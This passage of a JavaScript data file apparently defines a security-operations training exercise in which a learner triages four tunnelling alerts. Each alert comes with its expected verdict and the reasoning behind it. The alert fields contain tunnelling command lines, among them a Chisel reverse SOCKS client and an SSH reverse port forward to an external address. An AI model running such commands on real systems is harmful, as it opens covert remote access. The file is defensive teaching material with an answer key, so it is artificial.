          { id: "l7", text: "| where Logons > 40 and GapSpread < 5", tag: "Thresholds", tone: "trust", note: "Each limit is a range, not one magic value. An hourly job signs in 168 times a week: Logons > N drops 40 or fewer and keeps it for any N from 40 to 167. The job's gaps vary by 2 minutes and people's by 90 or more: GapSpread < X keeps one and drops the other for any X from 3 to 90." },
        ],
      },
    ],
    // ── Boss: the verdict ──
    "tunnel-ac1": [
      {
        kind: "queue",
        title: "Whose Wire Is It?",
        prompt: "Friday afternoon. The new rules have left four tunnel alerts in Halden's queue. Some are Halden's own wires. Read each one to the end, use Verify with IT to get the owner's answer, then close it the way it deserves or hand it on.",
        primer: {
          fold: true,
          title: "Three ways a detection can end",
          points: [
            "**True positive**: the rule saw what it looks for, and nothing authorises it.",
            "**Benign true positive**: the rule saw real activity, and a documented reason covers it.",
            "**False positive**: the activity isn't what the rule looks for at all.",
            "A reason counts only if it covers this host, this account, this destination and this time.",
          ],
          example: {
            label: "Worked example: a gas detector at the plant",
            lines: [
              "It trips with nothing planned, and gas is present: true positive.",
              "It trips during a scheduled calibration with test gas: benign true positive.",
              "It trips on a loose wire, with no gas at all: false positive.",
            ],
          },
        },
        console: "SIEM · Incidents",
        actions: [
          { id: "btp", label: "Close: benign true positive", tone: "close" },
          { id: "fp", label: "Close: false positive", tone: "close" },
          { id: "escalate", label: "Escalate", tone: "escalate" },
        ],
        alerts: [
          {
            id: "q1", time: "14:02", severity: "High", rule: "Tunnelling tool executed", entity: "HG-LAB-09",
            fields: [
              { k: "process", v: "chisel.exe client 198.51.100.200:8443 R:socks" },
              { k: "path", v: "C:\\Assess\\tools\\chisel.exe" },
              { k: "user", v: "HALDEN\\ext-assess2" },
            ],
            verify: { result: "confirmed", message: "Rules of engagement RoE-2026-14 list this host, account and destination for 3 to 7 November." },
            context: "The penetration test runs this week. The destination is the assessor's own server, named in the signed scope.",
            answer: "btp", why: "Real Chisel, really running, so the rule did its job. The rules of engagement cover this host, account, destination and date, so nothing here needs handing on.",
          },
          {
            id: "q2", time: "14:19", severity: "Medium", rule: "SSH client on a server", entity: "HG-APPS-04",
            fields: [
              { k: "process", v: "plink -ssh -N -L 1433:10.60.4.15:1433 -l svc-etl 10.60.1.10" },
              { k: "path", v: "C:\\Tools\\PuTTY\\plink.exe" },
              { k: "user", v: "HALDEN\\svc-etl" },
            ],
            verify: { result: "unverified", message: "CHG-20288 expired 2026-10-15. No renewal on file. Owner has not replied." },
            context: "Toolkit path, internal destination, a known service account. Everything looks routine, including the ticket number, until you read its date.",
            answer: "escalate", why: "A ticket that ended three weeks ago covers nothing today. It may well be innocent, but IT could not verify it, and that means it goes on rather than closing on looks.",
          },
          {
            id: "q3", time: "14:33", severity: "Low", rule: "Command line contains ssh", entity: "HG-OPS-ADM2",
            fields: [
              { k: "process", v: "python.exe C:\\Audit\\ssh_key_inventory.py --report" },
              { k: "connections", v: "0" },
              { k: "user", v: "HALDEN\\adm-k.ferro" },
            ],
            verify: { result: "confirmed", message: "Quarterly SSH key inventory, run by K. Ferro under CHG-20391. It reads key files and writes a report." },
            context: "The rule matches a string. This script reads local key files and writes a report. It opens no network connection and no SSH session.",
            answer: "fp", why: "No tunnel, no SSH, no connection at all: the rule matched a file name. That's a misfire, and the fix belongs in the rule's logic, not in an owner's inbox.",
          },
          {
            id: "q4", time: "14:51", severity: "High", rule: "Reverse forward to external host", entity: "HG-TURB-VA1",
            fields: [
              { k: "process", v: "ssh -fN -R 2022:127.0.0.1:22 support@203.0.113.212" },
              { k: "host role", v: "Turbine vendor's support appliance" },
              { k: "contract", v: "Remote support via 203.0.113.7 only" },
            ],
            verify: { result: "unverified", message: "Vendor agreement names a different address. Vendor has not confirmed this one." },
            context: "The appliance does phone home, by contract. But the contract names one address, and this isn't it.",
            answer: "escalate", why: "A real agreement exists, and it doesn't cover this destination. A reason counts only for what it names, so the vendor's general right to connect says nothing about 203.0.113.212.",
          },
        ],
      },
    ],
  },
};
